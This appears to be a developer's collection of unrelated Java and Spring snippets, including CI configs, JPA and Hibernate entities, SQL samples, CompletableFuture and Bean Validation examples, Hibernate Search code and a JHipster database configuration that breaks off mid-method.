        [System.IO.Compression.ZipFile]::ExtractToDirectory("C:\maven-bin.zip", "C:\maven")
      }
  - cmd: SET PATH=C:\maven\apache-maven-3.3.9\bin;%JAVA_HOME%\bin;%PATH%
  - cmd: SET MAVEN_OPTS=-XX:MaxPermSize=2g -Xmx4g
  - cmd: SET JAVA_OPTS=-XX:MaxPermSize=2g -Xmx4g

build_script:
  - mvn install -DskipTests=true -Dmaven.javadoc.skip=true -B -V

test_script:
  - mvn test -B

cache:
  - C:\maven\
  - C:\Users\appveyor\.m2

notifications:
  - provider: Email
    to:
      - error-prone-team+ci@google.com
    on_build_success: false
    on_build_failure: true
    on_build_status_changed: true
-------------------------------------------------------------------------------------------------------
language: java


matrix:
  allow_failures:
    - jdk: oraclejdk9
  include:
# JDK 8
    - jdk: oraclejdk8
      env: JDK_RELEASE='8'
# JDK 9
    - jdk: oraclejdk9
      env: JDK_RELEASE='9'

# use travis-ci docker based infrastructure
sudo: false

cache:
  directories:
    - $HOME/.m2

notifications:
  #email: error-prone-team@google.com
  webhooks:
    urls:
      - https://webhooks.gitter.im/e/74d33a22fbfb1942920e
    on_success: change  # options: [always|never|change] default: always
    on_failure: always  # options: [always|never|change] default: always

# Store encrypted credentials for gh-pages and sonatype:
# travis encrypt -r google/error-prone GH_TOKEN=<github access token>
# travis encrypt -r google/error-prone CI_DEPLOY_USERNAME=<sonatype username>
# travis encrypt -r google/error-prone CI_DEPLOY_PASSWORD=<sonatype password>

env:
  global:
    - secure: "kM6uLpPkYz/i5FTMAh0yUyhLrmJFDr643u49i9FHreg+L5n+DYUilbRPOfHhN802Wd9Pb1yGkFxbumuzo+ZjTjHmyjH5w5hsRvRrPVX3FRnMN5SMCnE95nBZJOyMrYHYnko+IXsENqqfPjTe5d/fUsMcwYcIPuqssaO+lvTv0Yw="
    - secure: "VTl3ljwGf0KPbX5wW1+MgQuLwpfSppph/STiyUOQkISO5jDwBAfnvcBymn/oLESwQeLZ/D+GZtL/sooG2Kf6v8Fdn6Q6VhwfSxgLDJUME+A4rOBBnDExhpUz+OT0XugWHfQ/sYRaDRk1/c1axt3XB/cxlzPNIJKlzDoPZpfDyGM="
    - secure: "FHXaeHYXmdGNYZLuSbAE7c5xmIhUT8/VzpnlkVmDgCPXgOGY7RzCpF4MVPIDm7f63bx/qZSu+d008gFHTI98UQLHMACjD1wuahk+0vqXVG1W3WwruqilTriYjW1gUkwa5zv5AaApq0dd5CO7li1DpNPgqOrU50ddJlb0BZ6wv1Q="

after_success:
  - util/publish-snapshot-on-commit.sh
  - util/generate-latest-docs.sh
-------------------------------------------------------------------------------------------------------
#! /bin/sh
PREFIX="taskset -c 0 java -XX:+UnlockDiagnosticVMOptions -XX:-TieredCompilation -XX:+PrintCompilation -jar out/nearly-optimal-mergesort.jar "
SEED=248442268

echo Running study 1 - Random Permutations
$PREFIX 1001 10_000,100_000,1_000_000 $SEED rp        times-rp-small       > times-rp-small.out
$PREFIX 9001          10_000          $SEED rp        times-rp-10k         > times-rp-10k.out
$PREFIX  201      10_000_000          $SEED rp        times-rp-10m         > times-rp-10m.out
$PREFIX   21     100_000_000          $SEED rp        times-rp-100m        > times-rp-100m.out

echo Running study 2 - sqrt-n runs
$PREFIX  201      10_000_000          $SEED runs3000    times-runs3k-10m   > times-runs3k-10m.out

echo Running study 3 - timdrag input
$PREFIX  201      16_777_216          $SEED timdrag32   times-timdrag32-16m > times-timdrag32-16m.out

#! /bin/sh
# -XX:+UnlockDiagnosticVMOptions -XX:+PrintCompilation
# -XX:-TieredCompilation
# -verbose:gc
PREFIX="taskset -c 2 java -Xms1g -Xmx1g -jar out/nearly-optimal-mergesort.jar "
SEED=248442268

echo Running study 1 - Random Permutations
$PREFIX 200          1000,5000,10_000,50_000,100_000   $SEED rp        times-rp             > times-rp.out
#$PREFIX  201      10_000_000          $SEED rp        times-rp-10m         > times-rp-10m.out
#$PREFIX   21     100_000_000          $SEED rp        times-rp-100m        > times-rp-100m.out

#echo Running study 2 - iid runs
#$PREFIX  200     1000,5000,10_000,50_000,100_000          $SEED iid500    times-iid500      > times-iid500.out

echo Running study 3 - sqrt-n runs
$PREFIX  200     1000,5000,10_000,50_000,100_000          $SEED runs30    times-runs30         > times-runs30.out
#$PREFIX  201      10_000_000          $SEED runs3000    times-runs3k-10m   > times-runs3k-10m.out

echo Running study 4 - timdrag input
$PREFIX  200      1000,5000,10_000,50_000,100_000          $SEED timdrag32   times-timdrag32 > times-timdrag32.out


-------------------------------------------------------------------------------------------------------
@Converter
public class FileConverter implements AttributeConverter<File, String> {

  @Override
  public String convertToDatabaseColumn(File attribute) {
      return attribute.getAbsolutePath();
  }

  @Override
  public File convertToEntityAttribute(String dbData) {
      return new File(dbData);
  }
}
-------------------------------------------------------------------------------------------------------
<properties>
  <property name="javax.persistence.lock.timeout" value="600000"/>
  <property name="javax.persistence.schema-generation.database.action" value="create"/>
  <property name="javax.persistence.jdbc.url" value="jdbc:h2:mem:test;DB_CLOSE_DELAY=-1;LOCK_TIMEOUT=600000"/>
</properties>
-------------------------------------------------------------------------------------------------------
INSERT INTO tablename (fieldname1, fieldname2, fieldname3)
SELECT * FROM (
    SELECT UNNEST(ARRAY[1, 2, 3]), 
           UNNEST(ARRAY[100, 200, 300]), 
           UNNEST(ARRAY['a', 'b', 'c'])
) AS temptable
WHERE NOT EXISTS (
    SELECT 1 FROM tablename tt
    WHERE tt.fieldname1=temptable.fieldname1
);
-------------------------------------------------------------------------------------------------------
public interface UserRepository extends MongoRepository<User, String> {
 
    @Async(AsyncConfiguration.TASK_EXECUTOR_REPOSITORY)
    CompletableFuture<Page<User>> findAllBy(final Pageable pageable);
 
    @Async(AsyncConfiguration.TASK_EXECUTOR_REPOSITORY)
    CompletableFuture<User> findOneById(final String id);
}
-------------------------------------------------------------------------------------------------------
https://www.humansreadcode.com/spring-boot-completablefuture/
https://www.nurkiewicz.com/2013/05/java-8-definitive-guide-to.html
https://github.com/spring-projects/spring-data-examples/tree/master/jpa/java8/src/main/java/example/springdata/jpa/java8

interface CustomerRepository extends Repository<Customer, Long> {

  @Query("select c from Customer c")
  Stream<Customer> streamAllCustomers();
}

try (Stream<Customer> customers = repository.streamAllCustomers()) {
  // use the stream here
}
-------------------------------------------------------------------------------------------------------
    List<String> webPageLinks = Arrays.asList(...)	// A list of 100 web page links
    // Download contents of all the web pages asynchronously
    List<CompletableFuture<String>> pageContentFutures = webPageLinks.stream()
            .map(webPageLink -> downloadWebPage(webPageLink))
            .collect(Collectors.toList());
    // Create a combined Future using allOf()
    CompletableFuture<Void> allFutures = CompletableFuture.allOf(
            pageContentFutures.toArray(new CompletableFuture[pageContentFutures.size()])
    );

    CompletableFuture<String> future1 = CompletableFuture.supplyAsync(() -> {
        try {
            TimeUnit.SECONDS.sleep(2);
        } catch (InterruptedException e) {
           throw new IllegalStateException(e);
        }
        return "Result of Future 1";
    });
    CompletableFuture<String> future2 = CompletableFuture.supplyAsync(() -> {
        try {
            TimeUnit.SECONDS.sleep(1);
        } catch (InterruptedException e) {
           throw new IllegalStateException(e);
        }
        return "Result of Future 2";
    });
    CompletableFuture<String> future3 = CompletableFuture.supplyAsync(() -> {
        try {
            TimeUnit.SECONDS.sleep(3);
        } catch (InterruptedException e) {
           throw new IllegalStateException(e);
        }
        return "Result of Future 3";
    });
    CompletableFuture<Object> anyOfFuture = CompletableFuture.anyOf(future1, future2, future3);
    System.out.println(anyOfFuture.get()); // Result of Future 2

    // When all the Futures are completed, call `future.join()` to get their results and collect the results in a list -
    CompletableFuture<List<String>> allPageContentsFuture = allFutures.thenApply(v -> {
       return pageContentFutures.stream()
               .map(pageContentFuture -> pageContentFuture.join())
               .collect(Collectors.toList());
    });
-------------------------------------------------------------------------------------------------------
// Run a task specified by a Runnable Object asynchronously.
CompletableFuture<Void> future = CompletableFuture.runAsync(new Runnable() {
    @Override
    public void run() {
        // Simulate a long-running Job
        try {
            TimeUnit.SECONDS.sleep(1);
        } catch (InterruptedException e) {
            throw new IllegalStateException(e);
        }
        System.out.println("I'll run in a separate thread than the main thread.");
    }
});
// Block and wait for the future to complete
future.get(
-------------------------------------------------------------------------------------------------------
    CompletableFuture<String> welcomeText  = CompletableFuture.supplyAsync(() -> {
    	try {
    		TimeUnit.SECONDS.sleep(1);
    	} catch (InterruptedException e) {
    		throw new IllegalStateException(e);
    	}
    	System.out.println(Thread.currentThread().getName());
    	return "Rajeev";
    }).thenApply(name -> {
    	System.out.println(Thread.currentThread().getName());
    	return "Hello " + name;
    		
    }).thenApply(greeting -> {
    	System.out.println(Thread.currentThread().getName());
    	return greeting + ", Welcome to the CalliCoder Blog";
    });
    System.out.println(Thread.currentThread().getName()+" go further");
    		
    // Block and wait for the future to complete
    System.out.println(Thread.currentThread().getName()+" "+welcomeText .get());
-------------------------------------------------------------------------------------------------------
SELECT * FROM INFORMATION_SCHEMA.CONSTRAINTS WHERE TABLE_NAME='EMPLOYEE'
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='CONSTRAINTS'

  public static void main(String[] args) {
      EntityManagerFactory emf = Persistence.createEntityManagerFactory("example-unit");
      try {
          EntityManager em = emf.createEntityManager();
          nativeQuery(em, "SHOW TABLES");
          nativeQuery(em, "SHOW COLUMNS from Customer");
          nativeQuery(em, "SHOW COLUMNS from ITEM_QTY");

          emf.close();
      } finally {
          emf.close();
      }
  }
  
Entity
public class EntityA {
  @Id
  @GeneratedValue
  private int id;

  @Embedded
  @AttributeOverrides({
          @AttributeOverride(name = "myStr", column = @Column(name = "MY_STR_COL1"))
  })
  @AssociationOverrides({
          @AssociationOverride(
                  name = "entityBRef", joinColumns = @JoinColumn(name = "EntityAB_JOIN1"))
  })
  private ClassA classARef;

  @Embedded
  @AttributeOverrides({
          @AttributeOverride(name = "myStr", column = @Column(name = "MY_STR_COL2"))
  })
  @AssociationOverrides({
          @AssociationOverride(
                  name = "entityBRef", joinColumns = @JoinColumn(name = "EntityAB_JOIN2"))
  })
  private ClassA classARef2;
    .............
}


SELECT * FROM INFORMATION_SCHEMA.SEQUENCES
-------------------------------------------------------------------------------------------------------
@Embeddable
public class Report {
  private String description;
  //@Convert(converter = FileConverter.class)
  private File file;
    .............
}

@Entity
public class Journal {
  @Id
  @GeneratedValue
  private long id;
  @ElementCollection
  @Convert(converter = FileConverter.class, attributeName = "file")
  private List<Report> reports;
    .............
}
-------------------------------------------------------------------------------------------------------
DROP TABLE PERSON;
DROP SEQUENCE SQ_PERSON;
CREATE TABLE PERSON(
 ID NUMBER(19),
 FIRST_NAME VARCHAR(255),
 LAST_NAME VARCHAR(255),
 ADDRESS VARCHAR(255),
 PRIMARY KEY (ID)
);

CREATE SEQUENCE SQ_PERSON MINVALUE 1 START WITH 1 INCREMENT BY 1 CACHE 10;

INSERT INTO PERSON VALUES (SQ_PERSON.nextval,'Rose','Kantata', '2736 Kooter Lane');
INSERT INTO PERSON VALUES (SQ_PERSON.nextval,'Mike','Togglie', '111 Cool Dr');
INSERT INTO PERSON VALUES (SQ_PERSON.nextval,'Dana', 'Whitley', '464 Gorsuch Drive');
INSERT INTO PERSON VALUES (SQ_PERSON.nextval,'Robin', 'Cash', '64 Zella Park');
INSERT INTO PERSON VALUES (SQ_PERSON.nextval,'Chary', 'Mess', '112 Yellow Hill');
-------------------------------------------------------------------------------------------------------
javax.validation.constraints.DecimalMax.message  = must be less than ${inclusive == true ? 'or equal to ' : ''}{value}
javax.validation.constraints.DecimalMin.message  = must be greater than ${inclusive == true ? 'or equal to ' : ''}{value}
javax.validation.constraints.Digits.message      = numeric value out of bounds (<{integer} digits>.<{fraction} digits> expected)
javax.validation.constraints.Max.message         = must be less than or equal to {value}
javax.validation.constraints.Min.message         = must be greater than or equal to {value}
javax.validation.constraints.Pattern.message     = must match "{regexp}"
javax.validation.constraints.Size.message        = size must be between {min} and {max}
-------------------------------------------------------------------------------------------------------
     public class Task {
        public void run (@Size(min = 3, max = 20) String name,
                         @NotNull Runnable runnable) {
            System.out.println("starting task synchronously: " + name);
            runnable.run();
        }
    }
	
    Task task = new Task();
    String taskName = "a"; //"myTask"
    Runnable runnable = null; // ()-> System.out.println("task running");

    ExecutableValidator executableValidator = validator.forExecutables();
    Set<ConstraintViolation<Task>> violations =
                      executableValidator.validateParameters(task,
                           Task.class.getDeclaredMethod("run",
                           new Class[]{String.class, Runnable.class}),
                           new Object[]{taskName, runnable});

    if (violations.size() > 0) {
          violations.stream().forEach(MethodParamValidationExample::printError);
    } else {
           task.run(taskName, runnable);
    }
-------------------------------------------------------------------------------------------------------
 LocalDate startDate = LocalDate.now();
  LocalDate endDate = LocalDate.now().minusDays(5);

  TradeHistory tradeHistory = new TradeHistory(startDate, endDate);

  Constructor<TradeHistory> constructor = TradeHistory.class.getConstructor(LocalDate
                            .class, LocalDate.class);

  ExecutableValidator executableValidator = validator.forExecutables();
  Set<ConstraintViolation<TradeHistory>> constraintViolations =
                     executableValidator.validateConstructorParameters(constructor,
                                                   new Object[]{startDate, endDate});

  if (constraintViolations.size() > 0) {
         constraintViolations.stream().forEach(
                               CrossParameterConstructorExample::printError);
  } else {
            //proceed using order
            System.out.println(tradeHistory);
  }   
-------------------------------------------------------------------------------------------------------
   public interface AppErrorHandler<T> extends Payload {
        void onError (ConstraintViolation<T> violation);
    }
-------------------------------------------------------------------------------------------------------
  public  class TestBean {
     @NotNull(payload = {ErrorEmailSender.class})
     private String str;

     //getters and setters

    }
	
	
  TestBean bean = new TestBean();
  Set<ConstraintViolation<TestBean>> constraintViolations =
                                                validator.validate(bean);

  if (constraintViolations.size() > 0) {
          constraintViolations.stream().forEach(
                                ConstraintPayloadExample2::processError);
  } else {
          //proceed using user object
            System.out.println(bean);
        }
  }


  private static void processError (ConstraintViolation<TestBean> violation) {
        Set<Class<? extends Payload>> payload =
                                   violation.getConstraintDescriptor().getPayload();

        payload.forEach(p -> {
            if (AppErrorHandler.class.isAssignableFrom(p)) {
                try {
                    AppErrorHandler errorHandler = (AppErrorHandler) p.newInstance();
                    errorHandler.onError(violation);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
  }
-------------------------------------------------------------------------------------------------------
  public class Severity {
        public static class Info implements Payload {}

        public static class Error implements Payload {}
    }
	
    public class TestBean {
      @NotNull(payload = {Severity.Error.class})
      @Size(min = 1, payload = {Severity.Info.class})
      private String str;

       public String getStr () {
            return str;
       }

       public void setStr (String str) {
            this.str = str;
       }
    }
	
        TestBean bean = new TestBean();
        //uncommenting next line will give us info severity
        // or setting a non-empty string won't give any validation error
        //bean.setStr("");

        Set<ConstraintViolation<TestBean>> constraintViolations =
                            validator.validate(bean);

        boolean severeError = false;

        if (constraintViolations.size() > 0) {
            for (ConstraintViolation<TestBean> violation : constraintViolations) {
                Set<Class<? extends Payload>> payloads =
                                    violation.getConstraintDescriptor().getPayload();
                for (Class<? extends Payload> payload : payloads) {
                    if (payload == Severity.Error.class) {
                        severeError = true;
                        System.out.println("Error: " + violation.getPropertyPath() + " " +
                                            violation.getMessage());
                    } else if (payload == Severity.Info.class) {
                        System.out.println("Info: " + violation.getPropertyPath() + " " +
                                            violation.getMessage());
                    }
                }
            }
        }

        if (!severeError) {
            //continue working with bean
            System.out.println("working with : " + bean);
        }
    }
-------------------------------------------------------------------------------------------------------
@Pattern(regexp = "\\d{3}-\\d{3}-\\d{4}")

  public static void main(String[] args) throws ParseException {
      Driver driver = new Driver(null, 60,
              new Date(System.currentTimeMillis() + 100000));
      DriverLicense dl = new DriverLicense(driver, 3454343);

      Validator validator = createValidator();
      Set<ConstraintViolation<DriverLicense>> violations =
              validator.validate(dl, LicenceNumberCheck.class, Default.class);
      if (violations.size() == 0) {
          System.out.println("No violations.");
      } else {
          System.out.printf("%s violations:%n", violations.size());
          violations.stream()
                    .forEach(ConvertGroupExample::printError);
      }
  }
  
  public static Validator createValidator() {
      Configuration<?> config = Validation.byDefaultProvider().configure();
      ValidatorFactory factory = config.buildValidatorFactory();
      Validator validator = factory.getValidator();
      factory.close();
      return validator;
  }
  
public class DriverLicense {
  @NotNull
  @Valid
  @ConvertGroup(from = LicenceNumberCheck.class,
          to = DriverPhysicalRequirement.class)
  private Driver driver;
  @Digits(integer = 7, fraction = 0, groups = LicenceNumberCheck.class)
  private int number;

  public DriverLicense(Driver driver, int number) {
      this.driver = driver;
      this.number = number;
  }
}

public class Driver {
  @NotNull
  private String fullName;
  @Min(value = 100, groups = DriverPhysicalRequirement.class)
  private int height;
  @Past(groups = DriverPhysicalRequirement.class)
  @NotNull
  private Date dateOfBirth;

  public Driver(String fullName, int height, Date dateOfBirth) {
      this.dateOfBirth = dateOfBirth;
      this.fullName = fullName;
      this.height = height;
  }
}
-------------------------------------------------------------------------------------------------------
# Настройка сервера на запуск с SSL/TLS и использования HTTPS
server.port = 8443
server.ssl.key-store = classpath:tomcat.keystore
server.ssl.key-store-password = password
server.ssl.key-password = password
-------------------------------------------------------------------------------------------------------
import javax.annotation.security.RolesAllowed;
import javax.ejb.Stateless;
import javax.ejb.TransactionAttribute;
import javax.ejb.TransactionAttributeType;
import javax.annotation.security.PermitAll;
import javax.annotation.security.RolesAllowed;
import javax.ejb.Remote;
import org.jboss.annotation.security.SecurityDomain;
import org.jboss.annotation.security.SecurityDomain;

@Stateless
@SecurityDomain("other")
@Remote(Calculator.class)
public class CalculatorBean implements Calculator
{
   @PermitAll
   @TransactionAttribute(TransactionAttributeType.REQUIRES_NEW)
   public int add(int x, int y)
   {
      return x + y;
   }

   @RolesAllowed({"student"})
   public int subtract(int x, int y)
   {
      return x - y;
   }

   @RolesAllowed({"teacher"})
   public int divide(int x, int y)
   {
      return x / y;
   }
}
-------------------------------------------------------------------------------------------------------
    <properties>
      <property name="hibernate.dialect" value="org.hibernate.dialect.HSQLDialect"/>
      <property name="hibernate.hbm2ddl.auto" value="update"/>
      <property name="hibernate.connection.driver_class" value="org.hsqldb.jdbcDriver"/>
      <property name="hibernate.connection.username" value="sa"/>
      <property name="hibernate.connection.password" value=""/>
      <property name="hibernate.connection.url" value="jdbc:hsqldb:data/tutorial"/>
    </properties>
-------------------------------------------------------------------------------------------------------
@Entity
@Table(name="PERSON_HIERARCHY")
@Inheritance(strategy=InheritanceType.SINGLE_TABLE)
@DiscriminatorColumn(name="DISCRIMINATOR",
                     discriminatorType=DiscriminatorType.STRING)
@DiscriminatorValue("PERSON")
class Person implements java.io.Serializable
{
   private int id;
   private String firstName;
   private String lastName;

   @Id @GeneratedValue
   public int getId() { return id; }
   public void setId(int id) { this.id = id; }

   public String getFirstName() { return firstName; }
   public void setFirstName(String first) { this.firstName = first; }

   public String getLastName() { return lastName; }
   public void setLastName(String last) { this.lastName = last; }
}
-------------------------------------------------------------------------------------------------------
public static Map<Object, Object> convertToMap(final String filePath) {

	// creating the properties object
	Properties properties = new Properties();

	// declaring the map object
	Map<Object, Object> propertyMap  = null;
	
	// creating file object
	File file = new File(filePath);

	FileReader fr = null;
	
	try {
		
		fr = new FileReader(file);

		properties.load(fr);
		
		propertyMap = new HashMap<Object, Object>(properties);

	} catch (FileNotFoundException e) {
		
		System.out.println(e.getMessage());
		e.printStackTrace();
		
	} catch (IOException e) {

		System.out.println(e.getMessage());
		e.printStackTrace();
	}
	
	return propertyMap;
}
-------------------------------------------------------------------------------------------------------
@Controller
public class LibraryController {
	
	public static final int USERS_PER_PAGE = 20;
	
	@Autowired
	LibraryUserDetailService userService;
  
  	@GetMapping("/admin-panel")
	public String showAdminPanel(	@RequestParam(value="search", required=false) String searchText,
					@RequestParam(value="pageNo", required=false) Integer pageNo,
					ModelMap model){
		
			if (searchText == null && pageNo == null) {
				return "admin-panel";
			}
			
			if (searchText != null && pageNo == null){
				pageNo = 1;
				model.put("pageNo", 1);
			}
			
			model.addAttribute("resultsCount", userService.searchUsersResultsCount(searchText));
			
			model.addAttribute("pageCount", userService.searchUserPagesCount(searchText, USERS_PER_PAGE));
			
			model.addAttribute("userList", userService.searchUsers(searchText, pageNo, USERS_PER_PAGE));
			return "admin-panel";
	}
https://habr.com/ru/company/rostelecom/blog/428578/
https://medium.com/@wkrzywiec/full-text-search-with-hibernate-search-lucene-part-1-e245b889aa8e

<!-- Configuration of Hibernate Session -->
   <bean id="sessionFactory"
      class="org.springframework.orm.hibernate3.annotation.AnnotationSessionFactoryBean">

      <property name="dataSource" ref="dataSource" />
      <property name="packagesToScan" value="de.user.server.model" />
      <property name="hibernateProperties">
         <props>
            <prop key="hibernate.hbm2ddl.auto">update</prop>
            <prop key="hibernate.show_sql">${jdbc.debug}</prop>
            <prop key="hibernate.format_sql">true</prop>
            <prop key="hibernate.id.new_generator_mappings">true</prop>
            <prop key="hibernate.dialect">${jdbc.dialect}</prop>
            <prop key="hibernate.jdbc.batch_size">0</prop>
            <prop key="hibernate.hbm2ddl.import_files">import.sql</prop>
            <prop key="hibernate.c3p0.idle_test_period">28680</prop>
            <prop key="hibernate.search.default.directory_provider">filesystem</prop>
            <prop key="hibernate.search.default.indexBase">H:/indexes</prop>

         </props>
      </property>

<!-- hibernate-envers for versioning of entities -->
      <property name="eventListeners">
         <map>
            <entry key="post-insert" value-ref="envers" />
            <entry key="post-update" value-ref="envers" />
            <entry key="post-delete" value-ref="envers" />
            <entry key="pre-collection-update" value-ref="envers" />
            <entry key="pre-collection-remove" value-ref="envers" />
            <entry key="post-collection-recreate" value-ref="envers" />
         </map>
      </property>
   </bean>
   
   
@Entity
@Indexed
@Connectable(modelClass = ModelClassEnum.TEXT)
public class Text extends AbstractDataObject {

    /**
     * Value generated automatically by eclipse.
     */
    private static final long serialVersionUID = 8096234710520978913L;

    private String text;

    public Text() {

    }    

    @Lob
    @Field (name="text",index=Index.YES, analyze=Analyze.YES,store=Store.YES)
    public String getText() {
        return this.text;
    }

public void setText(String text) {
        this.text = text;       
    }
}


import com.mkyong.model.BaseballCard;
import org.apache.lucene.search.Query;
import org.hibernate.search.jpa.FullTextEntityManager;
import org.hibernate.search.jpa.Search;
import org.hibernate.search.query.dsl.QueryBuilder;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import javax.persistence.EntityManager;
import javax.persistence.NoResultException;
import java.util.List;

@Service
public class HibernateSearchService {


    @Autowired
    private final EntityManager centityManager;


    @Autowired
    public HibernateSearchService(EntityManager entityManager) {
        super();
        this.centityManager = entityManager;
    }


    public void initializeHibernateSearch() {

        try {
            FullTextEntityManager fullTextEntityManager = Search.getFullTextEntityManager(centityManager);
            fullTextEntityManager.createIndexer().startAndWait();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    @Transactional
    public List<BaseballCard> fuzzySearch(String searchTerm) {

        FullTextEntityManager fullTextEntityManager = Search.getFullTextEntityManager(centityManager);
        QueryBuilder qb = fullTextEntityManager.getSearchFactory().buildQueryBuilder().forEntity(BaseballCard.class).get();
        Query luceneQuery = qb.keyword().fuzzy().withEditDistanceUpTo(1).withPrefixLength(1).onFields("name")
                .matching(searchTerm).createQuery();

        javax.persistence.Query jpaQuery = fullTextEntityManager.createFullTextQuery(luceneQuery, BaseballCard.class);

        // execute search

        List<BaseballCard> BaseballCardList = null;
        try {
            BaseballCardList = jpaQuery.getResultList();
        } catch (NoResultException nre) {
            ;// do nothing

        }

        return BaseballCardList;


    }
}


import javax.persistence.EntityManager;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import com.mkyong.service.HibernateSearchService;
@EnableAutoConfiguration 
@Configuration
public class HibernateSearchConfiguration {

	@Autowired
	private EntityManager bentityManager;

	@Bean
	HibernateSearchService hibernateSearchService() {
		HibernateSearchService hibernateSearchService = new HibernateSearchService(bentityManager);
		hibernateSearchService.initializeHibernateSearch();
		return hibernateSearchService;
	}
}


    @Autowired
    private HibernateSearchService searchservice;
	
	
	import com.mkyong.model.BaseballCard;
import com.mkyong.service.CardService;
import com.mkyong.service.HibernateSearchService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;

import java.util.List;

@Controller
public class CardController {

    @Autowired
    private HibernateSearchService searchservice;

    @Autowired
    private CardService cardservice;

    @RequestMapping(value = "/", method = RequestMethod.GET)
    public String search(@RequestParam(value = "search", required = false) String q, Model model) {
        List<BaseballCard> searchResults = null;
        try {
            cardservice.addCards();
            searchResults = searchservice.fuzzySearch(q);

        } catch (Exception ex) {
            // here you should handle unexpected errors
            // ...
            // throw ex;
        }
        model.addAttribute("search", searchResults);
        return "index";

    }

}
-------------------------------------------------------------------------------------------------------
    @Override
        public void run() {
            doProcess();
        }
     
        private void doProcess() {
            ...
     
            try {
                sendResponse(asyncContext.getResponse().getWriter(), jsnResult);    
            } catch (IOException ex) {
                Logger.getLogger(AsyncRequestProcessor.class.getName()).log(Level.SEVERE, null, ex);
            }
     
            asyncContext.complete();
        }
     
        public void sendResponse(PrintWriter out, JSONObject jsnResp) {
            Logger.getLogger(AsyncRequestProcessor.class.getName()).info("AsyncRequestProcessor: sending response: " + jsnResp.toString());
            
            asyncContext.getResponse().setContentType("application/json");
            
            out.print(jsnResp.toString());
        }
-------------------------------------------------------------------------------------------------------
    @Lob
    @Field (name="text",index=Index.YES, analyze=Analyze.YES,store=Store.YES)
    public String getText() {
        return this.text;
    }
	
	@Entity
@Audited
@Inheritance(strategy = InheritanceType.JOINED)
public class AbstractDataObject extends BaseDomainModel {
    private Long objectId;

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    @DocumentId
    public Long getObjectId() {
     return objectId;
    }
}
-------------------------------------------------------------------------------------------------------
    @FunctionalInterface
    public interface ExceptionResolver<T, E extends Throwable> {

        ResponseEntity<T> handle(final HttpServletRequest req, final E throwable, final HttpStatus status);
    }
-------------------------------------------------------------------------------------------------------
At Intertech we do a lot of sharing of expertise. Whether it’s someone on our team at that moment or a colleague working on another project, we make it a point to collaboratively share information to move all projects and clients forward. We also hope to share these quick tips with you in hopes it will help you someday in your work. Here is a quick tip I recently shared with my team that I thought you might find useful.

When a production code field should not have a setter method, typically in an immutable domain model, we need to use a different approach in tests for giving that field a value in an existing instance. This approach usually involves using Java’s reflection.

While directly using reflection for this is not difficult, it has some extra steps and checked exceptions to handle. The Spring ReflectionUtils class makes this a little easier. The following steps show how to use it.

1. Identify the object to set the value on (the one without the setter) and the value to set. In this example, “object” needs the “value” (no reflection in use in this step!).
MyEntity object = new MyEntity();
LocalDateTime value = LocalDateTime.now();
1
2
	
MyEntity object = new MyEntity();
LocalDateTime value = LocalDateTime.now();

2. Using reflection, obtain the Field reference from the class with the field to set. This step uses the Spring ReflectionUtils.findField method. This method takes two arguments, the Class having the field and the name of the field.
Field field = ReflectionUtils.findField(MyEntity.class, "createDate");
1
	
Field field = ReflectionUtils.findField(MyEntity.class, "createDate");

3. Using reflection, set the field’s accessible flag to true so we can then set the field’s value. The accessible flag toggles reflection access to Java internals, such as fields. This step uses the Spring ReflectionUtils.makeAccessible method. This method takes one argument, the Field reference.
ReflectionUtils.makeAccessible(field);
1
	
ReflectionUtils.makeAccessible(field);

4. Using reflection, set the value on the object. This step uses the Spring ReflectionUtils.setField method to set the value on the object. This method takes three arguments, the Field reference, the object to set the value on, and the value to set.
ReflectionUtils.setField(field, object, value);
1
	
ReflectionUtils.setField(field, object, value);-
--------------------------------------------------------------------------------------------------------
@SpringBootApplication(exclude = {        
    ElasticSearchRestHealthIndicatorAutoConfiguration.class
})
public class YourApplication

management.health.elasticsearch.enabled: false
--------------------------------------------------------------------------------------------------------
spring.elasticsearch.jest.uris=http://search.example.com:9200
spring.elasticsearch.jest.read-timeout=10000
spring.elasticsearch.jest.username=user
spring.elasticsearch.jest.password=secret
--------------------------------------------------------------------------------------------------------
import io.github.jhipster.config.JHipsterConstants;
import io.github.jhipster.config.liquibase.AsyncSpringLiquibase;

import com.fasterxml.jackson.datatype.hibernate5.Hibernate5Module;
import liquibase.integration.spring.SpringLiquibase;
import org.h2.tools.Server;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.boot.autoconfigure.liquibase.LiquibaseProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Profile;
import org.springframework.core.env.Environment;
import org.springframework.data.elasticsearch.repository.config.EnableElasticsearchRepositories;
import org.springframework.core.task.TaskExecutor;
import org.springframework.data.jpa.repository.config.EnableJpaAuditing;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.transaction.annotation.EnableTransactionManagement;

import javax.sql.DataSource;
import java.sql.SQLException;

@Configuration
@EnableJpaRepositories("com.springio.store.repository")
@EnableJpaAuditing(auditorAwareRef = "springSecurityAuditorAware")
@EnableTransactionManagement
@EnableElasticsearchRepositories("com.springio.store.repository.search")
public class DatabaseConfiguration {

    private final Logger log = LoggerFactory.getLogger(DatabaseConfiguration.class);

    private final Environment env;

    public DatabaseConfiguration(Environment env) {
        this.env = env;
    }

    /**
     * Open the TCP port for the H2 database, so it is available remotely.
     *
     * @return the H2 database TCP server
     * @throws SQLException if the server failed to start
     */
    @Bean(initMethod = "start", destroyMethod = "stop")
    @Profile(JHipsterConstants.SPRING_PROFILE_DEVELOPMENT)
    public Server h2TCPServer() throws SQLException {
        return Server.createTcpServer("-tcp","-tcpAllowOthers");
    }

    @Bean
    public SpringLiquibase liquibase(@Qualifier("taskExecutor") TaskExecutor taskExecutor,
